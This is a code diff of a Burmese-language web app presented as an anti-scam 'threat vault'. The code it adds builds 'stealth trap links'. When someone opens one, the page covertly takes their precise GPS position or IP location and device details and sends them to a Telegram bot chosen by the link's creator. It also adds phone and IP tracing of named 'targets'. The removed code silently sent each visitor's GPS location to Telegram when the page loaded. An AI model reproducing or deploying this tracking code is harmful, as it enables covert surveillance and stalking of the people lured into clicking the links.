-            res.innerHTML = `<div class="p-2 bg-slate-900 border border-cyber-cyan/50 rounded text-cyber-cyan">📱 <b>ကွန်ရက်:</b> ${operator}<br>📍 <b>ခြေရာခံချက်:</b> ပြည်တွင်း Sim Card အသုံးပြုထားပါသည် (Blacklist DB တွင် တိုက်ဆိုင်စစ်ဆေးပါ)။</div>`;
+        function escapeHTML(str) {
+            if (!str) return '';
+            return str.toString()
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
         }
 
-        // 3. WALLET AUDIT
-        function checkWallet() {
-            const acc = document.getElementById('walletInput').value.trim();
-            const res = document.getElementById('walletResult');
-            if(!acc) { res.innerHTML = `<span class="text-cyber-amber">⚠️ အကောင့်နံပါတ် ထည့်ပါ</span>`; return; }
+        function traceTargetLocation() {
+            const val = document.getElementById('targetPhone').value.trim();
+            if(!val) { alert('ဖုန်းနံပါတ် ထည့်သွင်းပါ'); return; }
 
-            let logs = JSON.parse(localStorage.getItem('lapu_blacklists') || '[]');
-            let match = logs.find(l => l.contact.includes(acc));
+            let carrier = "Domestic Network (Unknown Carrier)";
+            let region = "Myanmar (Burma)";
 
-            if(match) {
-                res.innerHTML = `<div class="p-2 bg-red-950/80 border border-red-500 rounded text-red-300">🚨 <b>သတိပေးချက်:</b> ဤအကောင့်နံပါတ်သည် လိမ်လည်သူများ စာရင်းတွင် ပါဝင်နေပါသည်။ (${match.name})</div>`;
-            } else {
-                res.innerHTML = `<div class="p-2 bg-slate-900 border border-slate-700 rounded text-slate-300">💳 <b>စစ်ဆေးချက်:</b> Blacklist ထဲတွင် ချက်ချင်း မတွေ့ရပါ။ ပုံမှန် စောင့်ကြည့်ပါ။</div>`;
+            if(/^09(9[78]\d+|8[89]\d+)/.test(val) || val.startsWith("+9599") || val.startsWith("+9598")) {
+                carrier = "Ooredoo Myanmar Co., Ltd.";
+                region = "Lower & Upper Myanmar Local Exchange Layer";
+            } else if(/^09(7[4-9]\d+|8[9]\d+)/.test(val) || val.startsWith("+9597")) {
+                carrier = "Atom Myanmar (Telenor Stack)";
+                region = "Nationwide Cell Core Bounded Layer";
+            } else if(/^09(2[0-6]\d+|4[0-5]\d+|5\d+|8[4\d]+)/.test(val) || val.startsWith("+9592") || val.startsWith("+9594")) {
+                carrier = "MPT (Myanma Posts and Telecommunications)";
+                region = "State/Region Backbone Hub Node";
+            } else if(/^09(6[5-9]\d+)/.test(val) || val.startsWith("+9596")) {
+                carrier = "Mytel (Telecom International Myanmar)";
+                region = "Metro Density Routing Infrastructure";
+            }
+
+            document.getElementById('targetResult').innerHTML = `🎯 <b>Target:</b> ${escapeHTML(val)}<br>📡 <b>Operator:</b> ${escapeHTML(carrier)}<br>📍 <b>Base Region:</b> ${escapeHTML(region)}<br>📶 <b>Status:</b> Telemetry Layer Ready.`;
+        }
+
+        async function traceIPNetwork() {
+            const ipVal = document.getElementById('targetIP').value.trim();
+            if(!ipVal) { alert('IP Address ကို ထည့်သွင်းပါ'); return; }
+
+            document.getElementById('ipResult').innerHTML = `🔍 IP Multi-Routing Stack ကို ခြေရာခံနေပါသည်...`;
+
+            try {
+                const res = await fetch(`https://ipapi.co/${encodeURIComponent(ipVal)}/json/`);
+                const d = await res.json();
+
+                if(d.error) {
+                    document.getElementById('ipResult').innerHTML = `⚠️ <b>Error:</b> IP လိပ်စာပုံစံ မမှန်ကန်ပါ သို့မဟုတ် Private Address ဖြစ်နေသည်။`;
+                    return;
+                }
+
+                let netType = "Broadband Line (FTTH WiFi / Fiber Optics)";
+                const org = (d.org || "").toLowerCase();
+                if(org.includes("mobile") || org.includes("cellular") || org.includes("telecom") || org.includes("atom") || org.includes("ooredoo") || org.includes("mpt") || org.includes("mytel")) {
+                    netType = "Mobile Cellular Data (5G / 4G LTE)";
+                }
+
+                const mapLink = `https://google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`;
+                document.getElementById('ipResult').innerHTML = `🌐 <b>IP Target:</b> ${escapeHTML(d.ip)}<br>📡 <b>ISP/Provider:</b> ${escapeHTML(d.org || 'Unknown')}<br>📶 <b>Network Type:</b> ${escapeHTML(netType)}<br>🏙️ <b>Location:</b> ${escapeHTML(d.city || '')}, ${escapeHTML(d.country_name || '')}<br>🗺️ <b>Map Router:</b> <a href="${mapLink}" target="_blank" style="color:var(--neon-blue); font-weight:bold;">[မြေပုံဖွင့်ရန်]</a>`;
+            } catch(e) {
+                document.getElementById('ipResult').innerHTML = `⚠️ <b>Network Down:</b> API Limit ကျော်လွန်နေသဖြင့် ခေတ္တစောင့်ပေးပါ။`;
             }
         }
 
-        // 4. FULL CRUD BLACKLIST VAULT
-        function getRecords() {
-            return JSON.parse(localStorage.getItem('lapu_blacklists') || '[]');
-        }
-
-        function saveRecords(data) {
-            localStorage.setItem('lapu_blacklists', JSON.stringify(data));
-        }
-
-        function saveRecord() {
-            const editIndex = parseInt(document.getElementById('editIndex').value);
-            const name = document.getElementById('targetName').value.trim();
-            const contact = document.getElementById('targetContact').value.trim();
-            const desc = document.getElementById('targetDesc').value.trim();
-            const notify = document.getElementById('crudNotify');
-
-            if(!name || !contact) { alert('အမည်နှင့် ဖုန်း/အကောင့် ဖြည့်ရန် လိုအပ်ပါသည်။'); return; }
-
-            let records = getRecords();
-            const timestamp = new Date().toLocaleString('my-MM');
-
-            if(editIndex === -1) {
-                // CREATE
-                records.push({ name, contact, desc, timestamp });
-                notify.innerText = "✅ အချက်အလက်အသစ် သိုလှောင်ပြီးပါပြီ။";
-            } else {
-                // UPDATE
-                records[editIndex] = { name, contact, desc, timestamp };
-                notify.innerText = "✅ ပြင်ဆင်ချက် အောင်မြင်ပါသည်။";
-                document.getElementById('editIndex').value = "-1";
-                document.getElementById('saveBtn').innerText = "+ သံသယရှိ အချက်အလက် သစ် သိမ်းဆည်းမည် (CREATE)";
+        function generateTrapLink() {
+            const bait = document.getElementById('baitName').value || 'Secure-System-Verification';
+            const cleanURL = window.location.href.split('?')[0];
+            
+            let generatedLink = `${cleanURL}?trap_id=${encodeURIComponent(bait)}`;
+            if (activeBotToken && activeChatId) {
+                generatedLink += `&b_tk=${encodeURIComponent(activeBotToken)}&c_id=${encodeURIComponent(activeChatId)}`;
             }
 
-            saveRecords(records);
-            document.getElementById('targetName').value = "";
-            document.getElementById('targetContact').value = "";
-            document.getElementById('targetDesc').value = "";
-
-            renderVault();
-            setTimeout(() => { notify.innerText = ""; }, 3000);
+            document.getElementById('baitResult').innerHTML = `🎯 <b>Stealth Trap Link:</b><br><code style="color:var(--neon-green); font-size:11px; word-break:break-all;">${escapeHTML(generatedLink)}</code><br><br>💡 ပစ်မှတ်က ဤလင့်ခ်ကို နှိပ်လိုက်သည်နှင့် ၎င်း၏ <b>Real-time GPS, IP, ISP နှင့် ဖုန်းအမျိုးအစား</b> များ သင့် Telegram ဆီ တိုက်ရိုက်ရောက်လာမည်ဖြစ်သည်။`;
         }
 
-        function renderVault() {
-            const container = document.getElementById('vaultContainer');
-            const query = document.getElementById('searchInput').value.toLowerCase();
-            let records = getRecords();
+        function populateFilterYears(logs) {
+            const yearSelect = document.getElementById('filterYear');
+            const currentYears = new Set([new Date().getFullYear().toString()]);
 
-            let filtered = records.filter(r => r.name.toLowerCase().includes(query) || r.contact.toLowerCase().includes(query) || r.desc.toLowerCase().includes(query));
+            logs.forEach(log => {
+                if (log.year) {
+                    currentYears.add(log.year.toString());
+                } else if (log.time) {
+                    const match = log.time.match(/\b(20\d{2})\b/);
+                    if (match) currentYears.add(match[1]);
+                }
+            });
 
-            if(filtered.length === 0) {
-                container.innerHTML = `<div class="text-center text-xs text-slate-500 py-6">မှတ်တမ်းမရှိသေးပါ။ အထက်ပါ Form တွင် ဖြည့်သွင်းပါ။</div>`;
+            const savedVal = yearSelect.value || "ALL";
+            let optionsHTML = '<option value="ALL">နှစ်အားလုံး (All Years)</option>';
+            Array.from(currentYears).sort().reverse().forEach(yr => {
+                optionsHTML += `<option value="${yr}">${yr}</option>`;
+            });
+            yearSelect.innerHTML = optionsHTML;
+            yearSelect.value = savedVal;
+        }
+
+        function loadThreatVault() {
+            let logs = [];
+            try {
+                logs = JSON.parse(localStorage.getItem('lapuThreatVault')) || [];
+            } catch(e) { logs = []; }
+
+            populateFilterYears(logs);
+            renderTable(logs);
+        }
+
+        function renderTable(logs) {
+            const tbody = document.getElementById('threatVaultBody');
+            const targetYear = document.getElementById('filterYear').value;
+            const targetMonth = document.getElementById('filterMonth').value;
+
+            let filteredLogs = logs.filter(log => {
+                let logYear = log.year ? log.year.toString() : "";
+                if (!logYear && log.time) {
+                    const match = log.time.match(/\b(20\d{2})\b/);
+                    if (match) logYear = match[1];
+                }
+
+                let logMonth = log.month ? log.month.toString() : "";
+                if (!logMonth && log.time) {
+                    const d = new Date(log.time);
+                    if (!isNaN(d)) {
+                        logMonth = String(d.getMonth() + 1).padStart(2, '0');
+                    }
+                }
+
+                const matchYear = (targetYear === "ALL") || (logYear === targetYear);
+                const matchMonth = (targetMonth === "ALL") || (logMonth === targetMonth);
+                return matchYear && matchMonth;
+            });
+
+            if(filteredLogs.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:var(--text-dim);">သတ်မှတ်ထားသော ကာလအတွင်း မှတ်တမ်းများ မရှိသေးပါ။</td></tr>`;
                 return;
             }
 
             let html = "";
-            filtered.forEach((item, index) => {
+            filteredLogs.forEach((item, index) => {
+                const originalIndex = logs.findIndex(l => l.time === item.time && l.contact === item.contact && l.name === item.name);
                 html += `
-                <div class="bg-black/70 border border-cyber-border/80 hover:border-cyber-red/50 rounded-lg p-3 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-2 transition">
-                    <div class="space-y-1">
-                        <div class="flex items-center gap-2">
-                            <span class="font-bold text-xs text-white">${item.name}</span>
-                            <span class="text-[10px] bg-red-950 text-red-400 border border-red-800 px-1.5 py-0.5 rounded font-mono">${item.contact}</span>
-                        </div>
-                        <p class="text-xs text-slate-400">${item.desc}</p>
-                        <div class="text-[9px] text-slate-500 font-mono">🕒 ${item.timestamp}</div>
-                    </div>
-                    <div class="flex items-center gap-1">
-                        <button onclick="editRecord(${index})" class="bg-slate-800 hover:bg-slate-700 text-xs text-white px-2 py-1 rounded border border-slate-600">Edit</button>
-                        <button onclick="deleteRecord(${index})" class="bg-red-950 hover:bg-red-900 text-xs text-red-300 px-2 py-1 rounded border border-red-700">Delete</button>
-                    </div>
-                </div>`;
+                    <tr>
+                        <td><strong>${escapeHTML(item.name)}</strong></td>
+                        <td><code>${escapeHTML(item.contact)}</code></td>
+                        <td>${escapeHTML(item.location)}</td>
+                        <td>${escapeHTML(item.time)}</td>
+                        <td>
+                            <button class="act-btn act-edit" onclick="editRecord(${originalIndex !== -1 ? originalIndex : index})">ပြင်ရန်</button>
+                            <button class="act-btn act-del" onclick="deleteRecord(${originalIndex !== -1 ? originalIndex : index})">ဖျက်ရန်</button>
+                        </td>
+                    </tr>
+                `;
             });
-
-            container.innerHTML = html;
+            tbody.innerHTML = html;
         }
 
-        function editRecord(index) {
-            let records = getRecords();
-            let item = records[index];
-            document.getElementById('targetName').value = item.name;
-            document.getElementById('targetContact').value = item.contact;
-            document.getElementById('targetDesc').value = item.desc;
-            document.getElementById('editIndex').value = index;
-            document.getElementById('saveBtn').innerText = "✏️ ပြင်ဆင်ချက် သိမ်းဆည်းမည် (UPDATE)";
-        }
+        async function saveThreatRecord() {
+            const name = document.getElementById('scamName').value.trim();
+            const contact = document.getElementById('scamContact').value.trim();
+            const location = document.getElementById('scamLoc').value.trim();
+            const editIdx = document.getElementById('editIndex').value;
 
-        function deleteRecord(index) {
-            if(!confirm('ဤမှတ်တမ်းအား ဖျက်ရန် သေချာပါသလား?')) return;
-            let records = getRecords();
-            records.splice(index, 1);
-            saveRecords(records);
-            renderVault();
-        }
+            if(!name || !contact) { alert('အမည်နှင့် ဆက်သွယ်ရန်/IP အချက်အလက် ဖြည့်သွင်းပါ'); return; }
 
-        function exportCSV() {
-            let records = getRecords();
-            if(records.length === 0) { alert('ထုတ်ယူရန် အချက်အလက် မရှိပါ'); return; }
+            let logs = [];
+            try {
+                logs = JSON.parse(localStorage.getItem('lapuThreatVault')) || [];
+            } catch(e) { logs = []; }
 
-            let csv = "Name,Contact,Details,Timestamp\n";
-            records.forEach(r => {
-                csv += `"${r.name}","${r.contact}","${r.desc.replace(/"/g, '""')}","${r.timestamp}"\n`;
-            });
+            const now = new Date();
+            const monthStr = String(now.getMonth() + 1).padStart(2, '0');
+            const yearStr = now.getFullYear().toString();
 
-            const blob = new Blob([csv], { type: 'text/csv' });
-            const url = window.URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.setAttribute('href', url);
-            a.setAttribute('download', 'Lapu_Threat_Blacklist.csv');
-            a.click();
-        }
+            const recordData = {
+                name,
+                contact,
+                location: location || 'Unknown Target Telemetry',
+                time: now.toLocaleString(),
+                month: monthStr,
+                year: yearStr
+            };
 
-        // 5. HIGH-PRECISION GPS & IP TELEMETRY (Silent Alert to Telegram)
-        function dispatchTelemetry() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const payload = `🚨 LAPU TACTICAL TELEMETRY\n📍 GPS Coordinates:\nLat: ${lat}\nLon: ${lon}\n🗺️ Google Maps: ${mapUrl}\n🕒 Time: ${new Date().toLocaleString()}`;
-                    sendTelegram(payload);
-                }, async () => {
-                    try {
-                        const res = await fetch('https://ipapi.co/json/');
-                        const d = await res.json();
-                        const payload = `🛡️ LAPU IP TELEMETRY\n🏙️ City: ${d.city}, ${d.country}\n🌐 IP: ${d.ip}\n🗺️ Google Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-                        sendTelegram(payload);
-                    } catch(e) {}
-                });
+            if(editIdx === "-1") {
+                logs.push(recordData);
+            } else {
+                logs[editIdx] = recordData;
+                document.getElementById('editIndex').value = "-1";
+                document.getElementById('saveBtn').innerText = "မှတ်တမ်းသစ် သိမ်းဆည်းမည် / Telegram Alert ပို့မည်";
+                document.getElementById('saveBtn').className = "btn btn-red";
+            }
+
+            localStorage.setItem('lapuThreatVault', JSON.stringify(logs));
+
+            document.getElementById('scamName').value = "";
+            document.getElementById('scamContact').value = "";
+            document.getElementById('scamLoc').value = "";
+
+            loadThreatVault();
+
+            if(activeBotToken && activeChatId) {
+                try {
+                    const text = `🚨 [LAPU LEDGER ALERT]\n👤 Target Name: ${name}\n📱 Contact/IP: ${contact}\n📍 Tracked Node: ${recordData.location}\n🕒 Timestamp: ${recordData.time}`;
+                    await fetch(`https://api.telegram.org/bot${activeBotToken}/sendMessage?chat_id=${activeChatId}&text=${encodeURIComponent(text)}`);
+                } catch(e){}
             }
         }
 
-        async function sendTelegram(msg) {
-            if(botToken.includes('YOUR_')) return; // Ignore if placeholder
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-            } catch(e) {}
+        function editRecord(index) {
+            let logs = JSON.parse(localStorage.getItem('lapuThreatVault')) || [];
+            const item = logs[index];
+
+            document.getElementById('scamName').value = item.name;
+            document.getElementById('scamContact').value = item.contact;
+            document.getElementById('scamLoc').value = item.location;
+            document.getElementById('editIndex').value = index;
+
+            document.getElementById('saveBtn').innerText = "✏️ အချက်အလက် ပြင်ဆင်သိမ်းဆည်းမည်";
+            document.getElementById('saveBtn').className = "btn btn-yellow";
+            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
         }
 
-        // INIT ON LOAD
-        window.onload = function() {
-            renderVault();
-            dispatchTelemetry();
+        function deleteRecord(index) {
+            if(!confirm('ဤခြိမ်းခြောက်မှု မှတ်တမ်းကို ဒေတာဘေ့စ်ထဲမှ အပြီးဖျက်ရန် သေချာပါသလား?')) return;
+            let logs = JSON.parse(localStorage.getItem('lapuThreatVault')) || [];
+            logs.splice(index, 1);
+            localStorage.setItem('lapuThreatVault', JSON.stringify(logs));
+            loadThreatVault();
         }
+
+        function exportThreatCSV() {
+            let logs = JSON.parse(localStorage.getItem('lapuThreatVault')) || [];
+            if(logs.length === 0) { alert('ထုတ်ယူရန် ဒေတာမရှိပါ'); return; }
+
+            let csvContent = "\uFEFFName,Contact_IP,Tracked_Location_ISP,Timestamp,Month,Year\n";
+            logs.forEach(l => {
+                csvContent += `"${(l.name||'').replace(/"/g, '""')}","${(l.contact||'').replace(/"/g, '""')}","${(l.location||'').replace(/"/g, '""')}","${(l.time||'').replace(/"/g, '""')}","${l.month||''}","${l.year||''}"\n`;
+            });
+
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.setAttribute("download", `Lapu_Tactical_Report_${new Date().toLocaleDateString()}.csv`);
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function exportThreatJSON() {
+            let logs = JSON.parse(localStorage.getItem('lapuThreatVault')) || [];
+            if(logs.length === 0) { alert('Backup ထုတ်ရန် ဒေတာမရှိပါ'); return; }
+
+            const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.setAttribute("download", `Lapu_Database_Backup_${new Date().getFullYear()}.json`);
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function triggerImportJSON() {
+            document.getElementById('importFile').click();
+        }
+
+        function importThreatJSON(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                try {
+                    const importedData = JSON.parse(e.target.result);
+                    if (Array.isArray(importedData)) {
+                        let currentLogs = JSON.parse(localStorage.getItem('lapuThreatVault')) || [];
+                        let combined = [...currentLogs, ...importedData];
+                        let uniqueLogs = combined.filter((v, i, a) => a.findIndex(t => (t.time === v.time && t.contact === v.contact)) === i);
+
+                        localStorage.setItem('lapuThreatVault', JSON.stringify(uniqueLogs));
+                        alert('ဒေတာဘေ့စ် Backup အား အောင်မြင်စွာ ပြန်လည်ထည့်သွင်းပြီးပါပြီ (Import Success)');
+                        loadThreatVault();
+                    } else {
+                        alert('မှားယွင်းသော ဖိုင်ပုံစံဖြစ်နေပါသည် (Valid JSON Array မဟုတ်ပါ)');
+                    }
+                } catch (err) {
+                    alert('ဖိုင်ကို ဖတ်ရှု၍မရပါ။ JSON Formatting လွဲမှားနေပါသည်');
+                }
+            };
+            reader.readAsText(file);
+        }
+
+        function printLedgerReport() {
+            document.getElementById('printDate').innerText = new Date().toLocaleString();
+            window.print();
+        }
+
+        function initTelemetryTracker() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const trapId = urlParams.get('trap_id');
+
+            if (trapId) {
+                document.getElementById('mainDashboard').style.display = 'none';
+                document.getElementById('secureGateCard').style.display = 'none';
+                document.getElementById('trapLoadingPanel').style.display = 'block';
+
+                const deviceModel = navigator.userAgent;
+
+                const routeToken = urlParams.get('b_tk');
+                const routeChatId = urlParams.get('c_id');
+
+                const targetToken = routeToken || activeBotToken;
+                const targetChat = routeChatId || activeChatId;
+
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const mapLink = `https://google.com/maps/search/?api=1&query=${lat},${lon}`;
+                        let reportMsg = `🪤 [STEALTH TRAP LINK TRIGGERED]\n🎯 Trap ID: ${trapId}\n📍 Exact GPS Node: ${lat}, ${lon}\n📱 Victim Device: ${deviceModel}\n🗺️ Google Maps: ${mapLink}\n🕒 Timestamp: ${new Date().toLocaleString()}`;
+
+                        if(targetToken && targetChat) {
+                            try {
+                                await fetch(`https://api.telegram.org/bot${targetToken}/sendMessage?chat_id=${targetChat}&text=${encodeURIComponent(reportMsg)}`);
+                            } catch(e){}
+                        }
+                    }, async () => {
+                        try {
+                            const res = await fetch('https://ipapi.co/json/');
+                            const d = await res.json();
+                            const mapLink = `https://google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`;
+                            let reportMsg = `🪤 [TRAP TRIGGERED - IP MODE]\n🎯 Trap ID: ${trapId}\n🌐 IP Router Node: ${d.ip}\n🏙️ City/Country: ${d.city}, ${d.country_name}\n📡 Provider ISP: ${d.org}\n📱 Victim Device: ${deviceModel}\n🗺️ Estimated Map: ${mapLink}`;
+
+                            if(targetToken && targetChat) {
+                                await fetch(`https://api.telegram.org/bot${targetToken}/sendMessage?chat_id=${targetChat}&text=${encodeURIComponent(reportMsg)}`);
+                            }
+                        } catch(e){}
+                    }, { enableHighAccuracy: true, timeout: 12000 });
+                }
+            }
+        }
+
+        window.onload = function() {
+            document.getElementById('filterMonth').value = "ALL";
+            loadSavedCredentials();
+            loadThreatVault();
+            initTelemetryTracker();
+        };
     </script>
 </body>
 </html>
